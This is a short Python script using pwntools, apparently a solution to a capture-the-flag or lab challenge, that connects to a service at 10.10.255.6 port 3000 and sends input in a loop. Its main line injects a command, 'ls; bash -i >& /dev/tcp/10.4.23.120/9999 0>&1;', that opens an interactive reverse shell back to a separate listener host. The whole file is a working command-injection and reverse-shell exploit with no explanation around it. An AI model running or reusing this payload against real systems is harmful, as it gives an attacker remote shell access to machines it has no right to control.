#!/usr/bin/python3

#* import pwntools
from pwn import *

# nc 10.10.255.6 3000

#? connect to the server 
s = connect("10.10.255.6", 3000)

# to keep the rev-shell open
while True:
	#print(s.recv())
	s.recv()
	s.sendline(b"[REPORT]")
	s.recv()
	#? revshell payload
	s.sendline(b"ls; bash -i >& /dev/tcp/10.4.23.120/9999 0>&1;")
	print(s.recv())
	s.sendline(b"jadu")
	#s.recv()
	print(s.recv())
	
s.close()